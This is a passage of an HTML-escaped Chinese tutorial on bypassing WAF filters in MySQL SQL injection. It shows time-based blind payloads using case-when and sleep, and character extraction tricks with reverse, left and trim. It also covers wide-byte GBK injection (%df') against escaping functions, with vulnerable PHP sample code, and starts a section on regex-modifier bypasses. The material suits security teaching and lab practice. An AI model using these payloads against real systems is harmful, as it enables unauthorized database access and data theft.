          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;ord(char)&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回字符的ASCII码&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;if(exp1, exp2, exp3)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;case when exp1 then exp2 else exp3 end&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;条件判断语句&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;database()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;schema()&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回当前数据库名&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;user()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;current_user()&lt;/code&gt;&lt;br&gt;&lt;code&gt;session_user()&lt;/code&gt;&lt;br&gt;&lt;code&gt;system_user()&lt;/code&gt;&lt;br /&gt;&lt;code&gt;@@user&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回当前数据库用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;version()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;@@version&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回数据库版本信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;concat(s1, s2, ...)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;concat_ws(sep, s1, s2, ...)&lt;/code&gt;&lt;br&gt;&lt;code&gt;group_concat(name)&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;拼接字符串&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;hex(str)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;0x...&lt;/code&gt; (十六进制字面量)&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;将字符串转换为十六进制&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;sleep(seconds)&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;benchmark(count, exp)&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;造成时间延迟&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;strong&gt;&lt;code&gt;datadir()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;@@datadir&lt;/code&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;返回数据库路径&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;大部分相信都很熟悉了，这里介绍个几个比较不常见的：&lt;/p&gt;
&lt;h4 id=&#34;case-when语句代替if&#34;&gt;case when语句代替if
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法一：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case when exp1 then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果exp1为真就返回exp2，反之返回exp3&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and (case when ascii(substring(database(),1,1))=100 then sleep(5) else 1 end)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;用法二：&lt;/strong&gt;&lt;/mark&gt; &lt;strong&gt;&lt;code&gt;case x when y then exp2 else exp3 end&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果x=y则返回exp2，反之返回exp3&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; and(case ascii(substring(database(),1,1)) when 100 then sleep(5) else 1 end)#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;reverseleft代替substring&#34;&gt;reverse+left代替substring
&lt;/h4&gt;&lt;p&gt;&lt;code&gt;left&lt;/code&gt;函数不能截取某一个精确的字符，但是结合&lt;code&gt;reverse&lt;/code&gt;和&lt;code&gt;ascii&lt;/code&gt;函数可以做到&lt;code&gt;substring+ascii&lt;/code&gt;一样的效果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;ascii&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;reverse&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;left&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;n&lt;/span&gt;)))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这个组合可以做到取出string字符串第n位的ascii码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;怎么工作的呢？我们以&lt;code&gt;ascii(reverse(left(&#39;ABCDE&#39;, 3)))&lt;/code&gt;为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;left(&#39;ABCDE&#39;, 3)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;首先，&lt;code&gt;left()&lt;/code&gt;函数从左边截取前3个字符，得到结果 &lt;code&gt;&#39;ABC&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;reverse(&#39;ABC&#39;)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接着，&lt;code&gt;reverse()&lt;/code&gt;函数将上一步的结果&lt;code&gt;&#39;ABC&#39;&lt;/code&gt;进行反转，得到&lt;code&gt;&#39;CBA&#39;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ascii(&#39;CBA&#39;)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是最关键的一步，&lt;code&gt;ascii()&lt;/code&gt;函数会返回其参数字符串的&lt;strong&gt;第一个字符&lt;/strong&gt;的ASCII码&lt;/p&gt;
&lt;p&gt;在这里，字符串&lt;code&gt;&#39;CBA&#39;&lt;/code&gt;的第一个字符是&lt;code&gt;&#39;C&#39;&lt;/code&gt;，其ASCII码是&lt;code&gt;67&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;trim代替substring&#34;&gt;trim代替substring
&lt;/h4&gt;&lt;p&gt;trim()函数在SQL中主要用于移除字符串首尾的字符&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;both&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;trailing&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;remstr&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;str&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;str&lt;/code&gt;&lt;/strong&gt;: 要处理的源字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;remstr&lt;/code&gt;&lt;/strong&gt;: 要从&lt;code&gt;str&lt;/code&gt;中移除的子字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;both|leading|trailing&lt;/code&gt;&lt;/strong&gt;: 指定移除的位置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;leading&lt;/code&gt;: 只从&lt;strong&gt;开头&lt;/strong&gt;移除&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;trailing&lt;/code&gt;: 只从&lt;strong&gt;结尾&lt;/strong&gt;移除&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;both&lt;/code&gt;: 从&lt;strong&gt;开头和结尾两端&lt;/strong&gt;移除（默认）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;但如果我们让它移除一个不存在的字符，他什么都不会做：&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;abcd&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;返回的结果仍然是abcd，因为abcd的开头不是e&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用这一点，我们就可以不直接比较字符是否相等，而是通过比较两次&lt;code&gt;trim()&lt;/code&gt;操作的结果是否相同，来推断一个字符是否是目标字符串的开头&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第一次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()) &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;a&amp;rsquo;）,后者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头也不是&amp;rsquo;b&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为真&lt;/p&gt;
&lt;p&gt;这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()) &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;c&amp;rsquo;）,后者返回 &lt;code&gt;&#39;vwa&#39;&lt;/code&gt; （开头是&amp;rsquo;d&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;vwa&#39;&lt;/code&gt;，表达式为假&lt;/p&gt;
&lt;p&gt;我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第三次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()) &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;表达式为&lt;code&gt;&#39;vwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头&lt;/p&gt;
&lt;p&gt;再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了&lt;/p&gt;
&lt;p&gt;如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头&lt;/p&gt;
&lt;p&gt;这样一位一位判断，就能凑出全貌&lt;/p&gt;
&lt;h2 id=&#34;7-宽字节绕过&#34;&gt;#7 宽字节绕过
&lt;/h2&gt;&lt;h3 id=&#34;注入原理&#34;&gt;注入原理
&lt;/h3&gt;&lt;p&gt;宽字节注入是一种专门针对Web应用程序与数据库之间&lt;strong&gt;字符集编码不一致&lt;/strong&gt;而产生的SQL注入漏洞&lt;/p&gt;
&lt;p&gt;其核心原理是PHP转义函数的单字节和MySQL数据库（当使用GBK等宽字节编码时）的多字节之间的矛盾&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Web应用层（如PHP）&lt;/strong&gt;：WAF在工作时，并不关心字符的实际编码 。它只是简单地将它认为是危险的单字节字符（如单引号&lt;code&gt;&#39;&lt;/code&gt;，其十六进制为&lt;code&gt;0x27&lt;/code&gt;），并前面加上一个反斜杠&lt;code&gt;\&lt;/code&gt;进行转义（十六进制为&lt;code&gt;0x5c&lt;/code&gt;），让这个危险的字符失去原本的功能，被当成普通的字符进行查询&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据库层（如MySQL）&lt;/strong&gt;：当数据库连接的字符集被设置为GBK这类宽字节编码时，它会尝试将两个连续的字节解析为一个汉字或其他宽字符&lt;/p&gt;
&lt;p&gt;在GBK编码中，一个宽字节的第一个字节的范围是&lt;code&gt;0x81-0xFE&lt;/code&gt; 。当MySQL遇到这个范围内的字节时，它会认为这是一个宽字符的开始，并把紧随其后的下一个字节也一并“吃掉”，作为该字符的第二部分&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者正是利用了MySQL的这个特性，构造一个第一个字节在&lt;code&gt;0x81-0xFE&lt;/code&gt;范围内、而第二个字节恰好是&lt;code&gt;0x5c&lt;/code&gt;（即反斜杠&lt;code&gt;\&lt;/code&gt;）的字符，让MySQL把PHP辛苦加上去的反斜杠当作普通字符“吃掉”，从而使单引号&lt;code&gt;&#39;&lt;/code&gt;重新变有效，导致注入成功&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;注入过程&#34;&gt;注入过程
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;mysql_query&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SET NAMES gbk&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;check_addslashes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这段代码的关键点在于，它&lt;strong&gt;使用&lt;code&gt;SET NAMES gbk&lt;/code&gt;将数据库连接设置为GBK编码&lt;/strong&gt;，同时&lt;strong&gt;又使用了自定义的&lt;code&gt;check_addslashes&lt;/code&gt;函数对输入进行转义&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;普通注入(1&amp;rsquo;#)：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;攻击者提交&lt;code&gt;?id=1&#39;#&lt;/code&gt;，&lt;code&gt;check_addslashes&lt;/code&gt;函数将&lt;code&gt;&#39;&lt;/code&gt;转义为&lt;code&gt;\&#39;&lt;/code&gt; ，mysql最后执行的语句是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里的转义后的&lt;code&gt;&#39;&lt;/code&gt;变成了普通的符号，无法闭合字符串&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;宽字节注入(1%df&amp;rsquo;#)：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;攻击者提交&lt;code&gt;?id=1%df&#39;#&lt;/code&gt;，&lt;code&gt;check_addslashes&lt;/code&gt;函数将&lt;code&gt;&#39;&lt;/code&gt;转义为&lt;code&gt;\&#39;&lt;/code&gt;，在url编码下变成：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?id=1%df%5c%27#
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;%5c&lt;/code&gt;就是被添加进去的反斜杠&lt;code&gt;\&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流&lt;code&gt;0xdf 0x5c 0x27&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MySQL首先读到&lt;code&gt;0xdf&lt;/code&gt;，因为它在&lt;code&gt;0x81-0xFE&lt;/code&gt;范围内，MySQL认为这是一个宽字符的开始&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;随后，MySQL“吃掉”了紧随其后的&lt;code&gt;0x5c&lt;/code&gt;（反斜杠&lt;code&gt;\&lt;/code&gt;）作为这个宽字符的第二字节&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;0xdf5c&lt;/code&gt;被组合成了一个宽字符（在GBK中为“運”），此时，用于转义的反斜杠&lt;code&gt;\&lt;/code&gt;已经被消耗掉了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MySQL继续向后解析，遇到了&lt;code&gt;0x27&lt;/code&gt;（单引号&lt;code&gt;&#39;&lt;/code&gt;）这个单引号前面已经没有了反斜杠，它变成了一个有效的SQL语法符号&lt;/p&gt;
&lt;p&gt;最终，MySQL实际执行的语句变成了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1運&amp;#39;&amp;#39; #
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8-正则表达式绕过&#34;&gt;#8 正则表达式绕过
&lt;/h2&gt;&lt;p&gt;众所周知，正则表达式里有很多的修正符，只有设置适当，才能过滤到目标的字符串&lt;/p&gt;
&lt;p&gt;有些粗心的WAF没有设置好修正符，这就让我们有机可乘：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$pattern&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;/select.*from/i&amp;#39;&lt;/span&gt;; 
